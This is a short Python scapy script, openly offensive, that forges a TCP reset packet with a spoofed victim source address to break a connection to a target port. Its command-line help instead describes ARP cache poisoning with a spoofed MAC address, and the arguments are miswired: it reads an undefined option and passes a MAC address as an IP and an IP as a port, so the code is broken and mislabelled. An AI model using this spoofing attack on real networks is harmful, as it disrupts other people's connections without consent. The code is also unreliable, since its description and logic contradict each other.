#!/usr/bin/python3
from scapy.all import *
import argparse



def poison(target, victim, port):
    # we're going to send the reset packet on the behalf of the victim
    evilIP = IP(src=victim, dst=target)
    # send to target port with the RST flag
    evilTCP = TCP(sport=31337, dport=int(port), flags="R")
    # build full packet and send
    evilPacket = evilIP/evilTCP
    # send that mischievous reset!
    sr1(evilPacket)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Poison a target''s ARP cache with a given MAC address')
    parser.add_argument('-t', metavar='target', help='the target whose ARP cache we''re going for')
    parser.add_argument('-m', metavar='mac', help='the MAC address we are spoofing')
    parser.add_argument('-i', metavar='ip', help='IP address we are spoofing')

    args = parser.parse_args()
    target = args.t
    macaddr = args.v
    ipaddr = args.i
    poison(target, macaddr, ipaddr)
